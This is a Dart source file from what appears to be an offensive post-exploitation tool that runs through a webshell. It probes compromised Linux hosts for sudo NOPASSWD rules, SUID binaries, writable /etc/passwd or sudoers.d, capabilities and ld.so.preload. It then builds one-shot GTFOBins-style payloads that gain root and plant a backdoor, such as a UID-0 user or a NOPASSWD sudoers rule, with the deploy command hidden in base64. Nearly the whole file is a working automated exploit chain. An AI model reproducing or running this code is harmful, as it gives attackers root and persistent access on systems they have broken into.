import 'dart:convert';

import 'priv_esc_landing.dart';

/// Severity tier of a vector. Maps to `PrivEscRiskLevel` after confirmation.
enum PrivEscTier {
  /// Directly auto-exploitable once confirmed (sudo / SUID / writable files).
  tier1,

  /// Needs download or on-target compile (kernel exploit) — later phase.
  tier2,

  /// Environment-dependent or read-only — informational lead only.
  tier3,
}

/// One-shot escalation payload for a SUID/sudo binary (GTFOBins-style).
///
/// [payloadTemplate] and [proofTemplate] use `{prefix}` (`''` for SUID,
/// `'sudo -n '` for sudo), `{bin}` (absolute path), and `{b64_root}` (base64 of
/// the landing deploy command). The base64 wrapper makes the whole thing free
/// of nested-quote problems: the only thing the target sees is
/// `sh -p -c "echo <b64> | base64 -d | sh -p"`.
class GtfoBin {
  const GtfoBin({
    required this.id,
    required this.name,
    required this.payloadTemplate,
    required this.proofTemplate,
    required this.proofMarkers,
    this.suidSafe = true,
    this.quirk,
  });

  /// Binary name, matched against the basename of a discovered path.
  final String id;
  final String name;
  final String payloadTemplate;
  final String proofTemplate;
  final List<String> proofMarkers;

  /// Whether the one-shot works when the binary is SUID (euid=0, ruid≠0).
  ///
  /// `false` means the payload only escalates when the real uid is already 0
  /// (the `sudo -n` path): some interpreters drop SUID privileges themselves
  /// (perl), and `system()`-based payloads route through a non-`-p` shell that
  /// drops euid (awk, tar, busybox). A SUID discovery of such a binary is
  /// reported as an informational lead instead of an exploitable primitive.
  final bool suidSafe;
  final String? quirk;
}

/// A concrete exploitable instance discovered on the target.
class PrivEscCandidate {
  const PrivEscCandidate({
    required this.vectorId,
    required this.evidence,
    this.binPath = '',
    this.prefix = '',
    this.gtfo,
  });

  final String vectorId;
  final String evidence;

  /// Absolute path of the binary (empty for non-binary vectors).
  final String binPath;

  /// `''` for SUID, `'sudo -n '` for sudo.
  final String prefix;

  /// Matched GTFOBins entry; null for fused (direct-landing) or lead vectors.
  final GtfoBin? gtfo;
}

/// A fully generated, self-contained command chain.
class PrivEscChain {
  const PrivEscChain({
    required this.deployCommand,
    required this.verifyCommand,
    this.rollbackCommand,
    required this.verifyStrength,
    required this.landingId,
  });

  /// Escalate + drop the backdoor in one shot; ends with `DEPLOY_OK`.
  final String deployCommand;

  /// Proves uid=0(root) via the backdoor.
  final String verifyCommand;
  final String? rollbackCommand;
  final LandingVerifyStrength verifyStrength;
  final String landingId;
}

/// A priv-esc vector = a probe command + a detector that turns its output into
/// candidates.
class PrivEscVector {
  const PrivEscVector({
    required this.id,
    required this.title,
    required this.description,
    required this.tier,
    required this.probeCommand,
    required this.detect,
    this.directLanding,
  });

  final String id;
  final String title;
  final String description;
  final PrivEscTier tier;

  /// Bounded (`timeout 25 …`) and directory-scoped probe command.
  final String probeCommand;

  /// Parses probe output into candidates.
  final List<PrivEscCandidate> Function(String output) detect;

  /// Fused landing for vectors that write a backdoor directly (writable
  /// /etc/passwd etc.). Null for primitive (SUID/sudo) and lead vectors.
  final LandingMethod? directLanding;
}

// ── GTFOBins / SUID / sudo binary table ────────────────────────────────────────

GtfoBin? _matchBin(String base) {
  for (final b in gtfoBins) {
    if (b.id == base) return b;
  }
  return null;
}

/// One-shot root-exec primitives (non-interactive, auto-exploitable).
const List<GtfoBin> gtfoBins = [
  GtfoBin(
    id: 'sh',
    name: 'sh',
    payloadTemplate:
        r'''{prefix}{bin} -p -c "echo {b64_root} | base64 -d | sh -p"''',
    proofTemplate: r'''{prefix}{bin} -p -c id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'dash',
    name: 'dash',
    payloadTemplate:
        r'''{prefix}{bin} -p -c "echo {b64_root} | base64 -d | sh -p"''',
    proofTemplate: r'''{prefix}{bin} -p -c id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'bash',
    name: 'bash',
    payloadTemplate:
        r'''{prefix}{bin} -p -c "echo {b64_root} | base64 -d | sh -p"''',
    proofTemplate: r'''{prefix}{bin} -p -c id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    quirk: 'SUID bash 必须带 -p，否则会丢弃 euid。',
  ),
  GtfoBin(
    id: 'find',
    name: 'find',
    payloadTemplate:
        r'''{prefix}{bin} . -exec sh -p -c "echo {b64_root} | base64 -d | sh -p" \; -quit''',
    proofTemplate: r'''{prefix}{bin} . -exec /usr/bin/id \; -quit''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'python',
    name: 'python',
    payloadTemplate:
        r'''{prefix}{bin} -c "import os,base64;os.setuid(0);os.setgid(0);os.execv('/bin/sh',['sh','-p','-c','echo {b64_root}|base64 -d|sh -p'])"''',
    proofTemplate:
        r'''{prefix}{bin} -c "import os;os.setuid(0);os.setgid(0);os.execv('/usr/bin/id',['id'])"''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'python3',
    name: 'python3',
    payloadTemplate:
        r'''{prefix}{bin} -c "import os,base64;os.setuid(0);os.setgid(0);os.execv('/bin/sh',['sh','-p','-c','echo {b64_root}|base64 -d|sh -p'])"''',
    proofTemplate:
        r'''{prefix}{bin} -c "import os;os.setuid(0);os.setgid(0);os.execv('/usr/bin/id',['id'])"''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'perl',
    name: 'perl',
    payloadTemplate:
        r'''{prefix}{bin} -e 'exec "/bin/sh","-p","-c","echo {b64_root}|base64 -d|sh -p"' ''',
    proofTemplate: r'''{prefix}{bin} -e 'exec "/usr/bin/id"' ''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    suidSafe: false,
    quirk: '现代 perl 以 SUID 运行会自动丢弃 euid，仅 sudo 免密路径可用。',
  ),
  GtfoBin(
    id: 'ruby',
    name: 'ruby',
    payloadTemplate:
        r'''{prefix}{bin} -e 'Process::Sys.setuid(0); exec "/bin/sh","-p","-c","echo {b64_root}|base64 -d|sh -p"' ''',
    proofTemplate:
        r'''{prefix}{bin} -e 'Process::Sys.setuid(0); exec "/usr/bin/id"' ''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'php',
    name: 'php',
    payloadTemplate:
        r'''{prefix}{bin} -r 'posix_setuid(0); system("echo {b64_root}|base64 -d|sh -p");' ''',
    proofTemplate: r'''{prefix}{bin} -r 'posix_setuid(0); system("/usr/bin/id");' ''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    quirk: '需要 posix 扩展（posix_setuid）。',
  ),
  GtfoBin(
    id: 'env',
    name: 'env',
    payloadTemplate:
        r'''{prefix}{bin} sh -p -c "echo {b64_root} | base64 -d | sh -p"''',
    proofTemplate: r'''{prefix}{bin} /usr/bin/id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
  ),
  GtfoBin(
    id: 'awk',
    name: 'awk',
    payloadTemplate:
        r'''{prefix}{bin} 'BEGIN {system("echo {b64_root}|base64 -d|sh -p")}' ''',
    proofTemplate: r'''{prefix}{bin} 'BEGIN {system("/usr/bin/id")}' ''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    suidSafe: false,
    quirk: 'system() 经由非 -p 的 sh 执行，SUID 下丢权，仅 sudo 免密路径可用。',
  ),
  GtfoBin(
    id: 'tar',
    name: 'tar',
    payloadTemplate:
        r'''{prefix}{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -p -c "echo {b64_root}|base64 -d|sh -p"' ''',
    proofTemplate:
        r'''{prefix}{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/usr/bin/id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    suidSafe: false,
    quirk: '需要 GNU tar；checkpoint exec 经由 sh 执行，SUID 下丢权，仅 sudo 免密路径可用。',
  ),
  GtfoBin(
    id: 'busybox',
    name: 'busybox',
    payloadTemplate:
        r'''{prefix}{bin} sh -p -c "echo {b64_root} | base64 -d | sh -p"''',
    proofTemplate: r'''{prefix}{bin} id''',
    proofMarkers: ['uid=0(root)', 'euid=0(root)'],
    suidSafe: false,
    quirk: 'busybox 的 SUID applet 行为依赖编译配置，常丢权，仅 sudo 免密路径可靠。',
  ),
];

/// Interactive-only SUID binaries — cannot be exploited over this channel, so
/// they become informational leads instead of executable chains.
const Map<String, String> interactiveSuidBins = {
  'vim': 'vim -c ":!/bin/sh"',
  'vi': 'vi -c ":!/bin/sh"',
  'less': 'less /etc/passwd  →  :!/bin/sh',
  'more': 'more /etc/passwd  →  :!/bin/sh',
  'ed': 'ed → :!/bin/sh',
  'nmap': 'nmap --interactive → !sh',
  'man': 'man man → !/bin/sh',
  'screen': 'screen -S hijack',
  'tmux': 'tmux -S <socket> attach',
};

// ── Detectors ─────────────────────────────────────────────────────────────────

/// Parse `sudo -n -l` output into sudo candidates.
List<PrivEscCandidate> detectSudo(String output) {
  final candidates = <PrivEscCandidate>[];
  if (RegExp(r'\(ALL(?::ALL)?\)\s+NOPASSWD:\s*ALL').hasMatch(output)) {
    candidates.add(
      PrivEscCandidate(
        vectorId: 'sudo',
        binPath: '/bin/sh',
        prefix: 'sudo -n ',
        gtfo: _matchBin('sh'),
        evidence: 'sudo 可免密执行任意命令（NOPASSWD: ALL）。',
      ),
    );
    return candidates; // ALL already covers every specific binary.
  }
  for (final m in RegExp(r'NOPASSWD:\s*([^\s,]+)').allMatches(output)) {
    final path = m.group(1)!;
    final base = path.split('/').last;
    final gtfo = _matchBin(base);
    if (gtfo != null) {
      candidates.add(
        PrivEscCandidate(
          vectorId: 'sudo',
          binPath: path,
          prefix: 'sudo -n ',
          gtfo: gtfo,
          evidence: 'sudo 可免密执行 $path（GTFOBins: ${gtfo.name}）。',
        ),
      );
    }
  }
  return candidates;
}

/// Parse SUID `find` probe output (one absolute path per line) into candidates.
List<PrivEscCandidate> detectSuid(String output) {
  final candidates = <PrivEscCandidate>[];
  for (final line in output.split('\n')) {
    final path = line.trim();
    if (!path.startsWith('/')) continue;
    final base = path.split('/').last;
    final gtfo = _matchBin(base);
    if (gtfo != null && gtfo.suidSafe) {
      candidates.add(
        PrivEscCandidate(
          vectorId: 'suid',
          binPath: path,
          gtfo: gtfo,
          evidence: '发现 SUID 二进制 $path（GTFOBins: ${gtfo.name}）。',
        ),
      );
    } else if (gtfo != null) {
      // Matched but SUID-unsafe: the interpreter drops euid under SUID.
      candidates.add(
        PrivEscCandidate(
          vectorId: 'suid-sudo-only',
          binPath: path,
          evidence:
              '发现 SUID 二进制 $path（GTFOBins: ${gtfo.name}），但 ${gtfo.name} 以 SUID 运行会自动丢弃权限，无法经 SUID 提权；仅当可 `sudo -n` 免密执行时可用（见 sudo 向量）。',
        ),
      );
    } else if (interactiveSuidBins.containsKey(base)) {
      candidates.add(
        PrivEscCandidate(
          vectorId: 'suid-interactive',
          binPath: path,
          evidence:
              '发现 SUID 二进制 $path，但需交互 TTY（${interactiveSuidBins[base]}），本通道不可直接执行。',
        ),
      );
    }
  }
  return candidates;
}

/// Detect a writable `/etc/passwd`.
List<PrivEscCandidate> detectWritablePasswd(String output) {
  if (output.trim() != 'writable') return const [];
  return const [
    PrivEscCandidate(
      vectorId: 'writable-passwd',
      evidence: '/etc/passwd 可写，可直接追加 UID-0 用户。',
    ),
  ];
}

/// Detect a writable `/etc/sudoers.d` (or `/etc/sudoers`).
List<PrivEscCandidate> detectWritableSudoers(String output) {
  if (output.trim() != 'writable') return const [];
  return const [
    PrivEscCandidate(
      vectorId: 'writable-sudoers',
      evidence: '/etc/sudoers.d 可写，可直接写入 NOPASSWD 规则。',
    ),
  ];
}

/// Detect dangerous capabilities (lead only — read-only or complex).
List<PrivEscCandidate> detectCapabilities(String output) {
  final candidates = <PrivEscCandidate>[];
  for (final line in output.split('\n')) {
    if (line.contains('cap_setuid')) {
      candidates.add(
        PrivEscCandidate(
          vectorId: 'capabilities',
          evidence: '发现 cap_setuid 二进制：${line.trim()}（可 setuid(0) 提权，需按解释器确认）。',
        ),
      );
    } else if (line.contains('cap_dac_read_search')) {
      candidates.add(
        PrivEscCandidate(
          vectorId: 'capabilities',
          evidence: '发现 cap_dac_read_search 二进制：${line.trim()}（仅可读敏感文件，非 root）。',
        ),
      );
    }
  }
  return candidates;
}

/// Detect a writable `/etc/ld.so.preload` — always informational: injecting a
/// malicious shared library there runs code in every new process (incl. root),
/// but a malformed entry breaks all process startup including the webshell.
List<PrivEscCandidate> detectLdPreload(String output) {
  final t = output.trim();
  if (t == 'writable') {
    return const [
      PrivEscCandidate(
        vectorId: 'ld-preload',
        evidence:
            '/etc/ld.so.preload 可写：可注入恶意共享库，让所有新进程（含 root 进程）加载。但写入错误会导致所有进程启动失败（含 webshell 自身），风险极高，仅作线索、绝不自动利用。',
      ),
    ];
  }
  if (t == 'exists') {
    return const [
      PrivEscCandidate(
        vectorId: 'ld-preload',
        evidence: '/etc/ld.so.preload 已存在，检查其内容判断是否已被植入。',
      ),
    ];
  }
  return const [];
}

// ── Vector table ──────────────────────────────────────────────────────────────

final List<PrivEscVector> vectors = [
  PrivEscVector(
    id: 'sudo',
    title: 'Sudo 免密提权',
    description: 'sudo -n -l 检测免密规则。',
    tier: PrivEscTier.tier1,
    probeCommand: r'''timeout 25 sudo -n -l 2>&1 | head -50''',
    detect: detectSudo,
  ),
  PrivEscVector(
    id: 'suid',
    title: 'SUID 提权',
    description: '枚举 SUID 二进制并匹配 GTFOBins 白名单。',
    tier: PrivEscTier.tier1,
    probeCommand:
        r'''timeout 25 find /bin /usr/bin /usr/sbin /sbin /usr/local/bin /opt /tmp /snap -maxdepth 3 -perm -4000 -type f 2>/dev/null | head -60''',
    detect: detectSuid,
  ),
  PrivEscVector(
    id: 'writable-passwd',
    title: '可写 /etc/passwd',
    description: '检测 /etc/passwd 是否可写。',
    tier: PrivEscTier.tier1,
    probeCommand:
        r'''[ -w /etc/passwd ] && echo writable || echo not writable''',
    detect: detectWritablePasswd,
    directLanding: landingById('passwd_user'),
  ),
  PrivEscVector(
    id: 'writable-sudoers',
    title: '可写 /etc/sudoers.d',
    description: '检测 /etc/sudoers.d 是否可写。',
    tier: PrivEscTier.tier1,
    probeCommand:
        r'''{ [ -d /etc/sudoers.d ] && [ -w /etc/sudoers.d ] && echo writable || echo not writable; }''',
    detect: detectWritableSudoers,
    directLanding: landingById('sudoers_nopasswd'),
  ),
  PrivEscVector(
    id: 'capabilities',
    title: 'Capabilities 线索',
    description: '检测 cap_setuid / cap_dac_read_search 等高危能力。',
    tier: PrivEscTier.tier3,
    probeCommand: r'''timeout 25 getcap -r / 2>/dev/null | head -40''',
    detect: detectCapabilities,
  ),
  PrivEscVector(
    id: 'ld-preload',
    title: '/etc/ld.so.preload 可写',
    description: '检测 /etc/ld.so.preload 是否可写（仅线索，绝不自动利用）。',
    tier: PrivEscTier.tier3,
    probeCommand:
        r'''[ -w /etc/ld.so.preload ] && echo writable || ([ -e /etc/ld.so.preload ] && echo exists || echo absent)''',
    detect: detectLdPreload,
  ),
];

// ── Chain builder ─────────────────────────────────────────────────────────────

/// Substitute `{param}` placeholders in a template.
String substituteTemplate(String template, Map<String, String> params) {
  var s = template;
  for (final entry in params.entries) {
    s = s.replaceAll('{${entry.key}}', entry.value);
  }
  return s;
}

/// Build the harmless proof command for a primitive candidate.
String? buildProofCommand(PrivEscCandidate candidate) {
  final gtfo = candidate.gtfo;
  if (gtfo == null) return null;
  return gtfo.proofTemplate
      .replaceAll('{prefix}', candidate.prefix)
      .replaceAll('{bin}', candidate.binPath);
}

/// Compose the self-contained chain: escalate + drop landing in one shot.
///
/// For primitive candidates the landing deploy is base64-wrapped into the
/// escalation primitive; for fused (direct-landing) candidates the deploy is
/// the landing itself (already writable as the current user).
PrivEscChain buildChain({
  required PrivEscCandidate candidate,
  required LandingMethod landing,
  required Map<String, String> params,
}) {
  final landingDeploy = substituteTemplate(landing.deployTemplate, params);
  final verify = substituteTemplate(landing.verifyTemplate, params);
  final rollback = substituteTemplate(landing.rollbackTemplate, params);

  final gtfo = candidate.gtfo;
  if (gtfo == null) {
    return PrivEscChain(
      deployCommand: landingDeploy,
      verifyCommand: verify,
      rollbackCommand: rollback,
      verifyStrength: landing.verifyStrength,
      landingId: landing.id,
    );
  }

  final b64Root = base64Encode(utf8.encode(landingDeploy));
  final deploy = gtfo.payloadTemplate
      .replaceAll('{prefix}', candidate.prefix)
      .replaceAll('{bin}', candidate.binPath)
      .replaceAll('{b64_root}', b64Root);
  return PrivEscChain(
    deployCommand: deploy,
    verifyCommand: verify,
    rollbackCommand: rollback,
    verifyStrength: landing.verifyStrength,
    landingId: landing.id,
  );
}
